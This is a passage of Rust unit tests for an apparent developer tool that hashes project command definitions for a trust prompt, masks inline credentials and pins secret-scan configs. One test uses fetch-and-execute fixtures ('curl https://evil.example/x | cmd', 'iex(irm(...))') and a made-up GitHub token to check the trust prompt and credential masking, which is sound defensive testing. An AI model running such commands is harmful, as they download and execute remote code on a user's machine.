            trust_prompt_entries(&processes, &[], vec!["stack entry".to_owned()]).len(),
            3
        );
    }

    #[test]
    fn a_trust_entry_shows_line_breaks_in_values_as_glyphs() {
        let def = ProcessDef {
            command: CommandLine::Shell("npm test".into()),
            env: [("PAD".to_owned(), "a\n\n\nb".to_owned())]
                .into_iter()
                .collect(),
            working_dir: Some(PathBuf::from("x\ny")),
            ..ProcessDef::default()
        };
        let line = trust_line(&def);
        assert_eq!(line, "npm test\n    in x␊y\n    env PAD=a␊␊␊b");
        // Every line after the first is one of the entry's own fields.
        assert!(
            line.lines().skip(1).all(|l| l.starts_with("    ")),
            "{line}"
        );
        let argv = ProcessDef {
            command: CommandLine::Argv(vec!["sh".into(), "-c".into(), "a\r\nb".into()]),
            ..ProcessDef::default()
        };
        assert_eq!(trust_line(&argv), "sh -c \"a␍␊b\"");
        assert_eq!(
            trust_entry("a\nb", &argv, false),
            "a␊b (auto-start): sh -c \"a␍␊b\""
        );
    }

    #[test]
    fn a_source_command_removed_or_stripped_of_its_key_is_no_longer_declared() {
        let before = ProjectYml::from_str(
            "processes:\n  stack:\n    command: stack serve\n    source: {}\n  feed:\n    command: feed\n    source: {}\n  kept:\n    command: kept\n    source: {}\n  web:\n    command: npm run dev\n",
        )
        .unwrap()
        .processes;
        // `stack` left the file, `feed` lost its `source:` key, `kept` is
        // still a source, `web` was never one.
        let after = ProjectYml::from_str("processes:\n  feed:\n    command: feed\n  kept:\n    command: kept --verbose\n    source: {}\n")
            .unwrap()
            .processes;
        let still = |name: &str| after.get(name).is_some_and(ProcessDef::is_source);
        assert_eq!(
            undeclared_sources(before.iter().map(|(n, d)| (n.as_str(), d)), still),
            vec!["stack", "feed"]
        );
        // A removed project declares nothing: every source goes, each once.
        let twice = before
            .iter()
            .chain(before.iter())
            .map(|(n, d)| (n.as_str(), d));
        assert_eq!(
            undeclared_sources(twice, |_| false),
            vec!["stack", "feed", "kept"]
        );
        // Nothing changed: nothing to forget.
        let same = |name: &str| before.get(name).is_some_and(ProcessDef::is_source);
        assert!(undeclared_sources(before.iter().map(|(n, d)| (n.as_str(), d)), same).is_empty());
    }

    fn planted() -> String {
        // Assembled at run time: no source line holds a credential.
        ["hu", "nt", "er2", "Zq"].concat()
    }

    fn def_with_secrets(pw: &str) -> ProcessDef {
        let mut env = IndexMap::new();
        env.insert("DB_PASSWORD".to_owned(), pw.to_owned());
        env.insert(
            "DATABASE_URL".to_owned(),
            format!("postgresql://app:{pw}@db:5432/x"),
        );
        env.insert("NODE_ENV".to_owned(), "development".to_owned());
        ProcessDef {
            command: CommandLine::Argv(vec![
                "psql".into(),
                format!("postgresql://app:{pw}@db:5432/x"),
            ]),
            env,
            ..ProcessDef::default()
        }
    }

    #[test]
    fn the_trust_prompt_shows_secrets_exactly_and_the_rows_mask_them() {
        let pw = planted();
        let def = def_with_secrets(&pw);
        // The prompt is what gets trusted, so it is exact, flagged.
        let line = trust_line(&def);
        assert!(!line.contains(stack_core::credentials::MASK), "{line}");
        assert!(
            line.contains(&format!("postgresql://app:{pw}@db:5432/x")),
            "{line}"
        );
        assert!(
            line.contains(&format!("DB_PASSWORD={pw}  ⚠ looks like")),
            "{line}"
        );
        assert!(line.contains("NODE_ENV=development"), "{line}");
        assert!(line.contains(stack_core::credentials::ADVICE), "{line}");
        let dir = tempfile::tempdir().unwrap();
        let proc = fresh_runtime(dir.path(), def.clone());
        let dto = ProjectProcessDto::from_process("db", &proc, None);
        let wire = serde_json::to_string(&dto).unwrap();
        assert!(!wire.contains(&pw), "{wire}");
        assert_eq!(
            dto.masked,
            ["command", "env.DB_PASSWORD", "env.DATABASE_URL"]
        );
        assert_eq!(dto.env["NODE_ENV"], "development");
        assert_eq!(dto.env["DB_PASSWORD"], "•••• (set inline)");
        let warnings = inline_credential_warnings([("db", &def)]);
        assert_eq!(warnings.len(), 3, "{warnings:?}");
        assert!(
            warnings[0].starts_with("chappa.yml: command `db` field `command`"),
            "{warnings:?}"
        );
        assert!(warnings.iter().all(|w| !w.contains(&pw)));
    }

    #[test]
    fn code_shaped_like_a_credential_is_shown_in_the_prompt_and_the_rows() {
        // Assembled so no source line looks like a key to a scanner.
        let header = format!("-----BEGIN {}PRIVATE KEY-----", "");
        let def = ProcessDef {
            command: CommandLine::Shell(format!(
                "echo {header} & curl https://evil.example/x | cmd"
            )),
            env: [(
                "X_TOKEN".to_owned(),
                "iex(irm('https://evil.example/p'))".to_owned(),
            )]
            .into_iter()
            .collect(),
            ..ProcessDef::default()
        };
        let line = trust_line(&def);
        assert!(line.contains("curl https://evil.example/x | cmd"), "{line}");
        assert!(
            line.contains("X_TOKEN=iex(irm('https://evil.example/p'))"),
            "{line}"
        );
        let dir = tempfile::tempdir().unwrap();
        let dto = ProjectProcessDto::from_process("x", &fresh_runtime(dir.path(), def), None);
        assert!(dto.command.contains("evil.example"), "{}", dto.command);
        assert_eq!(dto.env["X_TOKEN"], "iex(irm('https://evil.example/p'))");
        assert!(dto.masked.is_empty(), "{:?}", dto.masked);
        // A real token in a row label is still masked.
        let pat = format!("{}{}", "ghp_", "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6");
        let def = ProcessDef {
            command: CommandLine::Shell(format!("git clone https://x:{pat}@github.com/o/r")),
            ..ProcessDef::default()
        };
        let dto = ProjectProcessDto::from_process("x", &fresh_runtime(dir.path(), def), None);
        assert!(!dto.command.contains(&pat), "{}", dto.command);
        assert_eq!(dto.masked, ["command"]);
    }

    #[test]
    fn an_edit_keeps_a_masked_value_it_did_not_replace_and_takes_a_new_one() {
        let pw = planted();
        let stored = def_with_secrets(&pw);
        // Untouched: the editor sends the markers back.
        let mut kept = ProcessDef {
            command: CommandLine::Shell(UNCHANGED.to_owned()),
            env: [
                ("DB_PASSWORD", UNCHANGED),
                ("DATABASE_URL", UNCHANGED),
                ("NODE_ENV", "production"),
            ]
            .into_iter()
            .map(|(k, v)| (k.to_owned(), v.to_owned()))
            .collect(),
            ..ProcessDef::default()
        };
        resolve_unchanged(&mut kept, Some(&stored)).unwrap();
        assert_eq!(kept.command, stored.command);
        assert_eq!(kept.env["DB_PASSWORD"], pw);
        assert_eq!(kept.env["DATABASE_URL"], stored.env["DATABASE_URL"]);
        assert_eq!(kept.env["NODE_ENV"], "production");
        // Replaced: the new value wins.
        let mut replaced = ProcessDef {
            command: CommandLine::Shell("psql $DATABASE_URL".into()),
            env: [("DB_PASSWORD".to_owned(), "${DB_PASSWORD}".to_owned())]
                .into_iter()
                .collect(),
            ..ProcessDef::default()
        };
        resolve_unchanged(&mut replaced, Some(&stored)).unwrap();
        assert_eq!(
            replaced.command,
            CommandLine::Shell("psql $DATABASE_URL".into())
        );
        assert_eq!(replaced.env["DB_PASSWORD"], "${DB_PASSWORD}");
        // A marker with nothing behind it is refused, never written.
        let mut orphan = ProcessDef {
            command: CommandLine::Shell(UNCHANGED.to_owned()),
            ..ProcessDef::default()
        };
        assert!(resolve_unchanged(&mut orphan, None).is_err());
    }

    #[test]
    fn the_stored_trust_record_is_only_a_hash() {
        let pw = planted();
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("project");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join(project_model::yml::CHAPPA_YML_NAME),
            format!(
                "processes:\n  stack:\n    command: [chappa-stack, serve]\n    source: {{}}\n    env: {{ MARKER_ENV: marker-env-value }}\nstacks:\n  app:\n    components:\n      web:\n        driver: script\n        up: [node, scripts/marker-up.js]\n        env: {{ DB_PASSWORD: {pw} }}\n"
            ),
        )
        .unwrap();
        let mut store = ProjectStore::new(dir.path().join("projects.json"));
        let pid = store.add(root.clone(), "app".into(), None).unwrap().id;
        let hash = crate::stack_trust::trust_hash_on_disk(&root).unwrap();
        store.mark_trusted(pid, hash.clone()).unwrap();
        assert!(store.is_trusted(pid, &hash));
        let persisted = std::fs::read_to_string(dir.path().join("projects.json")).unwrap();
        for text in [
            "marker-up.js",
            "marker-env-value",
            "chappa-stack",
            "MARKER_ENV",
            pw.as_str(),
        ] {
            assert!(!persisted.contains(text), "{text} in {persisted}");
        }
    }

    #[test]
    fn a_changed_stack_definition_asks_again_and_the_runner_starts_again_with_the_new_hash() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let yml = "processes:\n  stack:\n    command: [chappa-stack, serve]\n    source: {}\n";
        std::fs::write(root.join(project_model::yml::CHAPPA_YML_NAME), yml).unwrap();
        std::fs::write(root.join("chappa.stack.yml"), "stacks:\n  app:\n    components:\n      web:\n        driver: script\n        up: [node, scripts/up.js]\n").unwrap();
        let mut store = ProjectStore::new(dir.path().join("projects.json"));
        let pid = store
            .add(root.to_path_buf(), "app".into(), None)
            .unwrap()
            .id;
        store
            .mark_trusted(pid, crate::stack_trust::trust_hash_on_disk(root).unwrap())
            .unwrap();
        let loaded = ProjectYml::load_result(root).unwrap();
        let stacks = crate::stack_trust::stack_sources(root, &loaded.processes);
        let mut processes: IndexMap<String, ProcessRuntime> = loaded
            .processes
            .clone()
            .into_iter()
            .map(|(n, d)| (n, fresh_runtime(root, d)))
            .collect();
        assert!(
            trust_stack_definitions(&mut processes, &stacks).is_empty(),
            "nothing live yet"
        );
        let first = processes["stack"].trusted_definition.clone().unwrap();
        // Only chappa.stack.yml changes: the project is no longer trusted.
        std::fs::write(root.join("chappa.stack.yml"), "stacks:\n  app:\n    components:\n      web:\n        driver: script\n        up: [node, scripts/other.js]\n").unwrap();
        let now = crate::stack_trust::trust_hash_on_disk(root).unwrap();
        assert!(!store.is_trusted(pid, &now), "the gate asks again");
        let stacks = crate::stack_trust::stack_sources(root, &loaded.processes);
        let lines = crate::stack_trust::prompt_lines(&stacks).join("\n");
        assert!(lines.contains("up: [node, scripts/other.js]"), "{lines}");
        // While it waits, the runner keeps the old hash: a restart runs nothing new.
        let launched = crate::stack_trust::with_trusted_definition(
            &processes["stack"].def,
            processes["stack"].trusted_definition.as_deref(),
        );
        assert_eq!(
            launched.command,
            CommandLine::Argv(vec![
                "chappa-stack".into(),
                "serve".into(),
                "--trusted-definition".into(),
                first.clone()
            ])
        );
        // Trusted: the live runner is named for a relaunch with the new hash.
        processes.get_mut("stack").unwrap().term_id = Some(7);
        processes
            .get_mut("stack")
            .unwrap()
            .lifecycle
            .on(ProcessEvent::Spawned, 1);
        assert_eq!(trust_stack_definitions(&mut processes, &stacks), ["stack"]);
        let second = processes["stack"].trusted_definition.clone().unwrap();
        assert_ne!(first, second);
        assert_eq!(Some(second), stacks[0].runnable_hash());
    }

    /// A project with a stack runner, trusted as it is on disk now.
    fn stack_project(dir: &Path) -> (ProjectStore, u32, PathBuf) {
        let root = dir.join("project");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join(project_model::yml::CHAPPA_YML_NAME),
            "processes:\n  stack:\n    command: [chappa-stack, serve]\n    source: {}\n  web:\n    command: [node, web.js]\n",
        )
        .unwrap();
        std::fs::write(root.join("chappa.stack.yml"), STACK_UP).unwrap();
        let mut store = ProjectStore::new(dir.join("projects.json"));
        let pid = store.add(root.clone(), "app".into(), None).unwrap().id;
        store
            .mark_trusted(pid, crate::stack_trust::trust_hash_on_disk(&root).unwrap())
            .unwrap();
        (store, pid, root)
    }

    const STACK_UP: &str = "stacks:\n  app:\n    components:\n      web:\n        driver: script\n        up: [node, scripts/up.js]\n";

    fn runtime_of(root: &Path) -> ProjectRuntime {
        let yml = ProjectYml::load_result(root).unwrap();
        ProjectRuntime {
            root: root.to_path_buf(),
            yml_hash: String::new(),
            processes: yml
                .processes
                .into_iter()
                .map(|(n, d)| (n, fresh_runtime(root, d)))
                .collect(),
            load_error: None,
            _yml_watcher: None,
            worktrees: None,
            scan_config: ProjectScanConfig::None,
            scan_config_watcher: None,
        }
    }

    /// A start needs the loaded content to be the trusted content: a project
    /// whose trust prompt was skipped (or never answered, or answered for
    /// other content) starts nothing, whichever path asks.
    #[test]
    fn no_command_starts_while_the_loaded_content_is_not_trusted() {
        let dir = tempfile::tempdir().unwrap();
        let (store, pid, root) = stack_project(dir.path());
        let trusted = crate::stack_trust::trust_hash_on_disk(&root).unwrap();
        // The parts, not a whole `Inner`: building one here would link the
        // app's window runtime into this test binary.
        assert!(
            !loaded_content_trusted(Some(&store), pid, None),
            "not open: nothing to start"
        );
        assert!(!loaded_content_trusted(
            Some(&store),
            pid,
            Some("content nobody trusted")
        ));
        assert!(loaded_content_trusted(Some(&store), pid, Some(&trusted)));
        assert!(!loaded_content_trusted(None, pid, Some(&trusted)));
        let err = ControlError::untrusted("web");
        assert!(matches!(err, ControlError::Untrusted(_)));
        assert!(err.to_string().starts_with(UNTRUSTED_START), "{err}");
    }

    #[test]
    fn untrusted_means_read_only_whether_the_project_is_open_or_not() {
        let dir = tempfile::tempdir().unwrap();
        let (store, pid, root) = stack_project(dir.path());
        let closed = |command: Option<&str>| {
            stack_refusal_of(&root, None, command, |h| store.is_trusted(pid, h))
        };
        // Not open: the stored trust against the disk.
        assert_eq!(closed(None), None);
        std::fs::write(
            root.join("chappa.stack.yml"),
            STACK_UP.replace("up.js", "other.js"),
        )
        .unwrap();
        let why = closed(None).unwrap();
        assert!(why.contains("trust it again"), "{why}");
        assert_eq!(closed(Some("stack")).as_deref(), Some(why.as_str()));
        assert_eq!(
            closed(Some("web")),
            None,
            "another command is not the stack"
        );
        // Open: each runner by the hash it was launched under.
        let mut rt = runtime_of(&root);
        let open = |rt: &ProjectRuntime| {
            let runners = stack_runners_of(rt, Some("stack"));
            stack_refusal_of(&root, Some(&runners), Some("stack"), |_| true)
        };
        assert!(open(&rt).is_some(), "launched with nothing trusted");
        let yml = ProjectYml::load_result(&root).unwrap();
        let stacks = crate::stack_trust::stack_sources(&root, &yml.processes);
        trust_stack_definitions(&mut rt.processes, &stacks);
        assert_eq!(open(&rt), None);
        assert!(stack_runners_of(&rt, Some("web")).is_empty());
        std::fs::write(
            root.join("chappa.stack.yml"),
            STACK_UP.replace("up.js", "third.js"),
        )
        .unwrap();
        assert!(open(&rt).is_some(), "edited after it was trusted");
    }

    #[test]
    fn a_new_gitleaks_config_in_settings_relaunches_the_live_stack_runners_only() {
        let mut old = Settings::default();
        let mut new = old.clone();
        assert!(!crate::settings::gitleaks_config_changed(&old, &new));
        new.secret_scan_config = r"C:\cfg\house.toml".into();
        assert!(crate::settings::gitleaks_config_changed(&old, &new));
        old.secret_scan_config = r" C:\cfg\house.toml ".into();
        assert!(!crate::settings::gitleaks_config_changed(&old, &new));

        let dir = tempfile::tempdir().unwrap();
        let (_store, pid, root) = stack_project(dir.path());
        let mut rt = runtime_of(&root);
        for name in ["stack", "web"] {
            let p = rt.processes.get_mut(name).unwrap();
            p.term_id = Some(3);
            p.lifecycle.on(ProcessEvent::Spawned, 1);
        }
        let mut runtimes = HashMap::new();
        runtimes.insert(pid, rt);
        assert_eq!(
            live_stack_runners(&runtimes),
            vec![(pid, vec!["stack".to_owned()])]
        );
        let stack = runtimes
            .get_mut(&pid)
            .unwrap()
            .processes
            .get_mut("stack")
            .unwrap();
        stack.term_id = None;
        assert!(
            live_stack_runners(&runtimes).is_empty(),
            "a stopped runner stays stopped"
        );
    }

    const SCAN_CONFIG: &str =
        "[extend]\nuseDefault = true\n\n[allowlist]\npaths = ['''^samples/''']\n";

    /// A stack project whose chappa.yml names its own gitleaks config.
    fn scan_config_project(dir: &Path) -> (ProjectStore, u32, PathBuf) {
        let root = dir.join("project");
        std::fs::create_dir_all(root.join("tools")).unwrap();
        std::fs::write(root.join("tools").join("gitleaks.toml"), SCAN_CONFIG).unwrap();
        std::fs::write(
            root.join(project_model::yml::CHAPPA_YML_NAME),
            "processes:\n  stack:\n    command: [chappa-stack, serve]\n    source: {}\nsecretScan:\n  config: tools/gitleaks.toml\n",
        )
        .unwrap();
        std::fs::write(root.join("chappa.stack.yml"), STACK_UP).unwrap();
        let mut store = ProjectStore::new(dir.join("projects.json"));
        let pid = store.add(root.clone(), "app".into(), None).unwrap().id;
        (store, pid, root)
    }

    /// The project's own gitleaks config is part of its trust: trusting it
    /// pins it at its hash (the runner gets both on its command line) and
    /// keeps its text for the next prompt; editing the file alone lapses
    /// trust, the pin stays at the old hash (the scans see the change and
    /// fall back), and the prompt shows what changed. Trusting again pins
    /// the new hash and names the live runner for a relaunch.
    #[test]
    fn an_edited_scan_config_lapses_trust_keeps_the_old_pin_and_asks_with_a_diff() {
        let dir = tempfile::tempdir().unwrap();
        let (mut store, pid, root) = scan_config_project(dir.path());
        let before_config = crate::stack_trust::trust_hash_on_disk(&root).unwrap();
        mark_trusted_with_config(&mut store, pid, &root, before_config.clone()).unwrap();
        assert_eq!(
            store.get(pid).unwrap().trusted_scan_config.as_deref(),
            Some(SCAN_CONFIG)
        );
        let yml = ProjectYml::load_result(&root).unwrap();
        let scan = ScanConfigSource::of(&root, &yml).unwrap();
        let first = next_scan_pin(&ProjectScanConfig::None, Some(&scan), true);
        let first_hash = match &first {
            ProjectScanConfig::Trusted { hash, .. } => hash.clone(),
            other => panic!("{other:?}"),
        };
        let mut rt = runtime_of(&root);
        assert!(
            pin_scan_config(&mut rt.processes, &first).is_empty(),
            "nothing live"
        );
        let launched = crate::stack_trust::launch_def(
            &rt.processes["stack"].def,
            None,
            "",
            &rt.processes["stack"].scan_config,
        )
        .unwrap();
        match &launched.command {
            CommandLine::Argv(w) => {
                assert!(w.contains(&first_hash), "{w:?}");
                assert!(w.contains(&crate::stack_trust::PROJECT_GITLEAKS_CONFIG_ARG.to_owned()));
            }
            other => panic!("{other:?}"),
        }

        // Only the config file changes: trust lapses, like an edited command.
        let edited = SCAN_CONFIG.replace("^samples/", "^.*");
        std::fs::write(root.join("tools").join("gitleaks.toml"), &edited).unwrap();
        let now = crate::stack_trust::trust_hash_on_disk(&root).unwrap();
        assert_ne!(now, before_config);
        assert!(!store.is_trusted(pid, &now), "the gate asks again");
        let scan = ScanConfigSource::of(&root, &yml).unwrap();
        // While it waits, the old pin stays: the scan's hash check falls back.
        assert_eq!(next_scan_pin(&first, Some(&scan), false), first);
        let chosen = stack_core::safety::secrets::config::choose(&first, None);
        assert_eq!(
            chosen.source,
            stack_core::safety::secrets::config::ConfigSource::Default
        );
        assert!(chosen
            .review
            .unwrap()
            .contains("changed since it was trusted"));
        let prompt = scan.prompt_entry(store.get(pid).unwrap().trusted_scan_config.as_deref());
        assert!(
            prompt.contains("changed since it was last trusted"),
            "{prompt}"
        );
        assert!(prompt.contains("+ paths = ['''^.*''']"), "{prompt}");
        assert!(
            prompt.contains("skips these files entirely: ^.*"),
            "{prompt}"
        );

        // Trusted again: a new pin, and the live runner starts again.
        let p = rt.processes.get_mut("stack").unwrap();
        p.term_id = Some(4);
        p.lifecycle.on(ProcessEvent::Spawned, 1);
        mark_trusted_with_config(&mut store, pid, &root, now.clone()).unwrap();
        assert_eq!(
            store.get(pid).unwrap().trusted_scan_config.as_deref(),
            Some(edited.as_str())
        );
        let second = next_scan_pin(&first, Some(&scan), true);
        assert_ne!(second, first);
        assert_eq!(pin_scan_config(&mut rt.processes, &second), ["stack"]);
    }

    /// A project nobody trusted, or a config that breaks a rule, never
    /// pins it; the runner is told `none` and says why.
    #[test]
    fn an_untrusted_or_invalid_scan_config_is_never_pinned() {
        let dir = tempfile::tempdir().unwrap();
        let (_store, _pid, root) = scan_config_project(dir.path());
        let yml = ProjectYml::load_result(&root).unwrap();
        let scan = ScanConfigSource::of(&root, &yml).unwrap();
        let pin = next_scan_pin(&ProjectScanConfig::None, Some(&scan), false);
        assert!(matches!(&pin, ProjectScanConfig::NotUsed { .. }), "{pin:?}");
        assert_eq!(pin.args().map(|(_, h)| h), Some("none"));
        std::fs::write(
            root.join("tools").join("gitleaks.toml"),
            "[extend]\nuseDefault = true\npath = \"more.toml\"\n",
        )
        .unwrap();
        let scan = ScanConfigSource::of(&root, &yml).unwrap();
        match next_scan_pin(&ProjectScanConfig::None, Some(&scan), true) {
            ProjectScanConfig::NotUsed { reason, .. } => {
                assert!(reason.contains("`[extend] path` is refused"), "{reason}")
            }
            other => panic!("{other:?}"),
        }
        // A project naming none is unchanged: the plain file hash.
        let plain = dir.path().join("plain");
        std::fs::create_dir_all(&plain).unwrap();
        std::fs::write(
            plain.join(project_model::yml::CHAPPA_YML_NAME),
            "processes:\n  web:\n    command: npm run dev\n",
        )
        .unwrap();
        assert_eq!(
            crate::stack_trust::trust_hash_on_disk(&plain).unwrap(),
            project_model::hash::file_content_hash(
                &plain.join(project_model::yml::CHAPPA_YML_NAME)
            )
            .unwrap()
        );
    }

    #[test]
    fn a_settings_gitleaks_config_inside_an_open_project_is_refused_and_dropped_at_launch() {
        let dir = tempfile::tempdir().unwrap();
        let (_store, _pid, root) = scan_config_project(dir.path());
        let mut settings = Settings {
            secret_scan_config: root
                .join("tools")
                .join("gitleaks.toml")
                .display()
                .to_string(),
            ..Settings::default()
        };
        let err = crate::settings::refuse_config_inside(&settings, std::slice::from_ref(&root))
            .unwrap_err();
        assert!(
            err.contains("use the project's own config through chappa.yml"),
            "{err}"
        );
        assert!(crate::settings::refuse_config_inside(&settings, &[]).is_ok());
        let outside = dir.path().join("house.toml");
        settings.secret_scan_config = outside.display().to_string();
        assert!(
            crate::settings::refuse_config_inside(&settings, std::slice::from_ref(&root)).is_ok()
        );
        // Saved before the project was opened: kept, not used.
        settings.secret_scan_config = root
            .join("tools")
            .join("gitleaks.toml")
            .display()
            .to_string();
        assert_eq!(
            crate::scan_config::settings_config(&settings, [root.as_path()]),
            None
        );
    }

    #[test]
    fn an_undeclared_source_lets_go_of_its_block_only_under_trusted_content() {
        use crate::sources::store::{self as source_store, SourceStore};
        use crate::sources::verdicts::{SavedVerdict, VerdictStore};
        let dir = tempfile::tempdir().unwrap();
        let config = dir.path().join("config");
        let root = dir.path().join("project");
        let inside = root.join("wt");
        std::fs::create_dir_all(&config).unwrap();
        std::fs::create_dir_all(&inside).unwrap();
        // A kept blocking verdict of the project's `stack` source.
        let sources_file = config.join(source_store::FILE_NAME);
        let id = crate::sources::source_id_of(&SourceStore::launched_key(&root, "stack"));
        let block = crate::data_safety::parse_block(&serde_json::json!({ "dataSafety": {
            "instance": "app/0", "state": "not-clean", "blocksAgents": true,
            "project": root.display().to_string(),
            "reasons": [{ "component": "db", "text": "db: 1 finding (card-number ×1)" }],
        }}));
        VerdictStore::beside(&sources_file)
            .put(
                &id,
                SavedVerdict {
                    block,
                    secret_scan: None,
                    source_label: "Stack app".into(),
                    manifest_id: "stack:app".into(),
                    fallback: Some(root.clone()),
                    saved_ms: 1,
                },
            )
            .unwrap();
        let start = || {
            let sources = Sources::default();
            sources.init_with(
                SourceStore::new(sources_file.clone()),
                Arc::new(crate::sources::NullEmitter),
            );
            sources
        };
        let sources = start();
        // A reload of content nobody trusted that dropped the source: the
        // block stays, across a restart too.
        settle_undeclared(&sources, &root, vec!["stack".to_owned()], false, &[]);
        assert!(crate::data_safety::check_launch(&sources, &inside).is_err());
        let sources = start();
        assert!(crate::data_safety::check_launch(&sources, &inside).is_err());
        // The next load of trusted content (or the trust answer) lifts it.
        settle_undeclared(&sources, &root, Vec::new(), true, &[]);
        assert!(crate::data_safety::check_launch(&sources, &inside).is_ok());
        assert!(VerdictStore::beside(&sources_file).get(&id).is_none());

        // The app's own write is trusted content exactly when the project's
        // content was trusted before it, and what is trusted is what the
        // app wrote, not what the file holds when looked at again.
        let yml = root.join(project_model::yml::CHAPPA_YML_NAME);
        std::fs::write(&yml, "processes: {}\n").unwrap();
        let mut store = ProjectStore::new(dir.path().join("projects.json"));
        let pid = store.add(root.clone(), "app".into(), None).unwrap().id;
        store
            .mark_trusted(pid, hash::file_content_hash(&yml).unwrap())
            .unwrap();
        let snapshot = TrustSnapshot {
            stacks: Vec::new(),
            scan: None,
        };
        let write = |store: &mut ProjectStore, command: &str| {
            project_model::native::mutate(store, pid, |defs| {
                defs.clear();
                defs.insert(
                    "web".into(),
                    ProcessDef {
                        command: command.into(),
                        ..ProcessDef::default()
                    },
                );
                Ok(())
            })
            .unwrap();
        };
        write(&mut store, "npm run dev");
        trust_own_write(&mut store, pid, Some(&snapshot));
        assert!(store.is_trusted(pid, &hash::file_content_hash(&yml).unwrap()));
        write(&mut store, "npm start");
        trust_own_write(&mut store, pid, None);
        assert!(!store.is_trusted(pid, &hash::file_content_hash(&yml).unwrap()));
        // Another writer edits the file after the app's write: trusting the
        // app's write does not trust that edit.
        store
            .mark_trusted(pid, hash::file_content_hash(&yml).unwrap())
            .unwrap();
        write(&mut store, "npm test");
        let mut text = std::fs::read_to_string(&yml).unwrap();
        text.push_str("  evil:\n    command: curl example.invalid\n");
        std::fs::write(&yml, &text).unwrap();
        trust_own_write(&mut store, pid, Some(&snapshot));
        assert!(!store.is_trusted(pid, &hash::file_content_hash(&yml).unwrap()));
        // A write whose commands now name a stack the snapshot did not hold
        // carries nothing over.
        let with_stack = TrustSnapshot {
            stacks: crate::stack_trust::stack_sources(&root, &store.process_defs(pid)),
            scan: None,
        };
        assert!(with_stack.stacks.is_empty());
    }

    #[test]
    fn a_list_command_spawns_its_program_directly() {
        let settings = settings_with("cmd", vec![]);
        let argv = CommandLine::Argv(vec!["py".into(), "-c".into(), r#"print("a & b")"#.into()]);
        let (program, args, env) = process_command(&argv, &settings).unwrap();
        assert_eq!(program, "py");
        assert_eq!(
            args,
            vec!["-c", r#"print("a & b")"#],
            "words pass through untouched"
        );
        assert!(env.is_empty(), "no cmd quote indirection for a list");
        // A shell line still goes through the profile.
        let (program, args, _) = process_command(&"py app/x.py".into(), &settings).unwrap();
        assert_eq!(
            (program.as_str(), args),
            ("cmd", vec!["/C".to_owned(), "py app/x.py".to_owned()])
        );
        // An empty list is refused rather than panicking.
        assert!(process_command(&CommandLine::Argv(vec![]), &settings).is_err());
    }

    /// A profile-named exec target uses the profile's PROGRAM plus the flag
    /// this heuristic picks from the program name.
    #[test]
    fn named_profile_picks_the_exec_flag_by_program_name() {
        let profiles = vec![
            profile("PS", "powershell.exe -NoLogo", true),
            profile("PS7", "pwsh.exe", true),
            profile("CMD", "C:/WINDOWS/system32/cmd.exe", true),
            profile("Bash", "C:/tools/bash.exe", true),
        ];
        let cases: &[(&str, &str, &[&str])] = &[
            // The profile's OWN args are dropped: `-NoLogo` here is the flag
            // set the heuristic supplies, not the profile's.
            ("PS", "powershell.exe", &["-NoLogo", "-Command"]),
            ("PS7", "pwsh.exe", &["-NoLogo", "-Command"]),
            ("CMD", "C:/WINDOWS/system32/cmd.exe", &["/C"]),
            ("Bash", "C:/tools/bash.exe", &["-c"]),
        ];
        for (name, want_program, want_flags) in cases {
            let settings = settings_with(name, profiles.clone());
            let (program, args) = execution_command("make", &settings);
            assert_eq!(&program, want_program, "profile {name}");
            let mut want: Vec<String> = want_flags.iter().map(|s| (*s).to_owned()).collect();
            want.push("make".to_owned());
            assert_eq!(args, want, "profile {name}");
        }
    }

    /// An unknown exec-profile name (or one with a blank command) degrades to
    /// the builtin — a bad settings value must never make a project
    /// unstartable.
    #[test]
    fn unknown_or_blank_exec_profile_falls_back_to_the_builtin() {
        for settings in [
            settings_with("ghost", vec![]),
            settings_with("Blank", vec![profile("Blank", "   ", true)]),
        ] {
            let (program, args) = execution_command("make", &settings);
            let builtin = if cfg!(windows) { "cmd" } else { "sh" };
            assert_eq!(program, builtin);
            assert_eq!(args.len(), 2);
            assert_eq!(args[1], "make");
        }
    }

    // ---- notification-level DTO wire keys -------------------------

    fn process_runtime(command: &str) -> ProcessRuntime {
        ProcessRuntime {
            def: ProcessDef {
                command: command.into(),
                ..Default::default()
            },
            lifecycle: Lifecycle::new(),
            term_id: None,
            exit_code: None,
            backoff: RestartBackoff::new(),
            channel: None,
            watcher: None,
            watcher_rx: None,
            watcher_started: false,
            spawned_at: Instant::now(),
            generation: 0,
            trusted_definition: None,
            scan_config: ProjectScanConfig::None,
        }
    }

    /// The TS half builds against these exact keys: the level rides the
    /// project DTO as `notificationLevel` (camelCase, alongside the untouched
    /// `{id, name, path, icon}`) and the process DTO as `notificationLevel`.
    #[test]
    fn notification_level_wire_keys_are_camel_case() {
        let info = ProjectInfoDto {
            id: 1,
            name: "chappa-ai".into(),
            path: "/chappa-ai".into(),
            icon: None,
            initials: None,
            color: None,
            notification_level: Some("important".into()),
            secret_scan: None,
        };
        let json = serde_json::to_value(&info).unwrap();
        assert_eq!(json["notificationLevel"], "important");
        assert!(json.get("notification_level").is_none());
        // The wire DTO is exactly these eight keys — no sync flag.
        let keys: std::collections::BTreeSet<&str> = json
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(
            keys,
            [
                "id",
                "name",
                "path",
                "icon",
                "initials",
                "color",
                "notificationLevel",
                "secretScan"
            ]
            .into_iter()
            .collect::<std::collections::BTreeSet<&str>>()
        );
        // The pre-keys are untouched by the added rename_all.
        assert_eq!(json["id"], 1);
        assert_eq!(json["name"], "chappa-ai");
        assert_eq!(json["path"], "/chappa-ai");
        assert!(json["icon"].is_null());

        let json = serde_json::to_value(ProjectProcessDto::from_process(
            "server",
            &process_runtime("py app/server.py"),
            None,
        ))
        .unwrap();
        assert_eq!(json["name"], "server");
        assert!(json.get("notificationLevel").is_some());
        assert!(json["notificationLevel"].is_null());
        assert!(json.get("notification_level").is_none());
    }

    /// The DTOs carry the RAW stored values — resolution ("per-process
    /// override → project default → 'all'") is the UI's job, so an
    /// un-overridden process is `null` here, NEVER the project default and
    /// NEVER 'all'.
    #[test]
    fn process_dto_carries_the_raw_override_not_a_resolved_level() {
        let level = |l: &str| ProcessOverride {
            notification_level: Some(l.to_owned()),
            ..Default::default()
        };
        let mut overrides = BTreeMap::new();
        overrides.insert("server".to_owned(), level("none"));
